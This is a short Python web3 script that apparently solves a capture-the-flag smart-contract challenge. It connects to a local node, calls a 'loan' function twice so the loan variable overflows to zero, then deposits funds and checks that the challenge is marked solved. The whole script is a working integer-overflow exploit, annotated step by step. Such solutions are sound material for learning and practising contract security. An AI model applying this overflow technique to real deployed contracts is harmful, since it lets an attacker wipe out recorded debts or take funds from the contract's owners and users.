from web3 import Web3, HTTPProvider
import json
web3 = Web3(HTTPProvider("http://127.0.0.1:47518")) # Replace with the actual RPC
contract_address = "0xf912C2ABE58475D105dF678c327293FDc39b2AA7" # Replace with the actual contract address
wallet="0x9A2bb5637DC2A7f76E29cba1BD7Dfc65286230ac" # Replace with the actual wallet

f = open('./build/contracts/Chall.json','r')
contract_json=json.load(f)

abi=contract_json['abi']
bank = web3.eth.contract(address=contract_address,abi=abi)
bank.functions.loan(2**48-1).transact({'from':wallet}) # Take a loan of maximum minus one
bank.functions.loan(1).transact({'from':wallet}) # Take a loan of one, overflowing the loan variable. It is now zero!
bank.functions.deposit(2**48-1).transact({'from':wallet,'value':2**48-1}) # Deposit the required ammount


print(bank.functions.isChallSolved().call()) # It is now solved!
